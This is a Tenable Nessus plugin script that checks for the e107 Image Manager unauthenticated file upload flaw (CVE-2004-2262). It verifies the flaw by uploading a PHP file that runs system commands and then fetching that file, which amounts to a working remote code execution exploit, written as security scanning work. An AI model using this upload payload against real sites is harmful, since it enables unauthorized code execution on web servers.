#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(16061);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2015/09/24 21:08:38 $");

  script_cve_id("CVE-2004-2262");
  script_bugtraq_id(12111);
  script_osvdb_id(12586);
  script_xref(name:"EDB-ID", value:"704");

  script_name(english:"e107 Image Manager Unauthorized File Upload");
  script_summary(english:"Attempts to upload a file to execute arbitrary code");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that allows for
arbitrary file uploads."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of e107 installed on the remove host is affected by a
file upload vulnerability that could allow remote, unauthenticated
attackers to upload arbitrary files on the remote host.  An attacker
may exploit this flaw to upload a PHP file to the remote host
containing arbitrary code and then execute this code on the remove
host, subject to the privileges of the web server user id."
  );
  script_set_attribute(attribute:"see_also", value:"http://e107.org/comment.php?comment.news.621");
  script_set_attribute(attribute:"see_also", value:"http://e107.org/news.php?item.672");
  script_set_attribute(attribute:"solution", value:
"Upgrade to e107 0.617 or later or apply the referenced patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2004/12/21");
  script_set_attribute(attribute:"patch_publication_date", value:"2004/09/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/01/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:e107:e107");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2004-2015 Tenable Network Security, Inc.");

  script_dependencie("e107_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/e107");
  exit(0);
}

# Check starts here

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

# Test an install.

install = get_install_from_kb(
  appname      : "e107",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];
install_url = build_url(port:port, qs:dir);
path = NULL;

# Verify images.php exists before sending our exploit
url = "/e107_handlers/htmlarea/popups/ImageManager/images.php";

res = http_send_recv3(
  method  : "GET",
  port    : port,
  item    : dir + url,
  exit_on_fail : TRUE
);

if ("<title>Image Browser" >!< res[2])
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "e107", install_url);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

vuln = FALSE;
token = SCRIPT_NAME + '-' + unixtime() + '.php';

foreach cmd (cmds)
{
  # Get path to the file uploaded for use in our reporting section
  if (cmd == 'id') upload_path = "system('pwd')";
  else upload_path = "system('dir "+ token +"')";

  # Form  our PHP file to upload
  boundary = '----Nessus\r\n';
  boundary2 = '--Nessus';

  php_shell = boundary +
    'Content-Disposition: form-data; name="dirPath"\r\n\r\n' + '\r\n' +
    boundary +
    'Content-Disposition: form-data; name="url"\r\n\r\n\r\n' +
    boundary +
    'Content-Disposition: form-data; name="width"\r\n\r\n\r\n' +
    boundary +
    'Content-Disposition: form-data; name="vert"\r\n\r\n\r\n' +
    boundary +
    'Content-Disposition: form-data; name="alt"\r\n\r\n\r\n' +
    boundary +
    'Content-Disposition: form-data; name="height"\r\n\r\n\r\n' +
    boundary +
    'Content-Disposition: form-data; name="horiz"\r\n\r\n\r\n' +
    boundary +
    'Content-Disposition: form-data; name="upload"; filename=\"' +
    token + '\"\r\n' + 'Content-Type: application/octet-stream\r\n\r\n' +
    "<?php echo('<pre>'); system('"+cmd+"');" + upload_path + ";?>" + '\r\n' +
    boundary +
    'Content-Disposition: form-data; name="align"\r\n\r\n' +
    'baseline\r\n' +
    boundary +
    'Content-Disposition: form-data; name="border"\r\n\r\n\r\n' +
    boundary +
    'Content-Disposition: form-data; name="orginal_width"\r\n\r\n\r\n' +
    boundary +
    'Content-Disposition: form-data; name="orginal_height"\r\n\r\n\r\n' +
    boundary +
    'Content-Disposition: form-data; name="constrain_prop"\r\n\r\n' +
    'on\r\n' +
    boundary +
    'Content-Disposition: form-data; name="ok"\r\n\r\n' +
    'Refresh\r\n' +
    boundary +
    'Content-Disposition: form-data; name="ok"\r\n\r\n' +
    'OK\r\n' +
    boundary +
    'Content-Disposition: form-data; name="cancel"\r\n\r\n' +
    'Cancel\r\n' +
    '--' + boundary2 + '--\r\n\r\n\r\n\r\n';

 #Attempt upload
  res2 = http_send_recv3(
    method    : "POST",
    item      : dir + url ,
    data      : php_shell,
    add_headers:
      make_array("Content-Type",
                 "multipart/form-data; boundary=" + boundary2),
    port         : port,
    exit_on_fail : TRUE
  );
  exp_request = http_last_sent_request();

  # Try accessing the file we created
  upload_loc = "/e107_images/";
  res2 = http_send_recv3(
    method       : "GET",
    item         : dir + upload_loc + token,
    port         : port,
     exit_on_fail : TRUE
  );
  output = res2[2];

  if (egrep(pattern:cmd_pats[cmd], string:output))
  {
    vuln = TRUE;
    get_up_path = "" + token;

   # Extract path for reporting
    if (cmd == 'id')
    {
      get_path = strstr(output, "/");
      get_up_path = chomp(get_path) + "/" + token;
      output = strstr(output, "uid") - get_path;
    }
    else
    {
      get_path = strstr(output, "Volume in drive");
      output = strstr(output, "Windows IP") - get_path;
      get_dir = egrep(pattern:"Directory of (.+)", string:get_path);
      if(!isnull(get_dir))
         get_up_path = chomp((get_dir - " Directory of ")) + '\\' + token;
    }
    break;
  }
}

if (!vuln)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, "e107", install_url, "Uploader plugin");

if (report_verbosity > 0)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);

  report =
    '\nNessus was able to verify the issue exists using the following request :' +
     '\n' +
     '\n' + install_url + upload_loc + token +
     '\n' +
     '\nNote: This file has not been removed by Nessus and will need to be' +
     '\nmanually deleted (' + get_up_path + ').' +
     '\n';
  if (report_verbosity > 1)
  {
    report +=
      '\nThis file was uploaded using the following request :' +
      '\n' +
      '\n' + snip +
      '\n' + exp_request +
      '\n' + snip +
      '\n' +
      '\n' + 'The file uploaded by Nessus executed the command "'+cmd+ '"' +
      '\nwhich produced the following output :' +
      '\n' +
      '\n' + snip +
      '\n' + chomp(output) +
      '\n' + snip +
      '\n';
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);

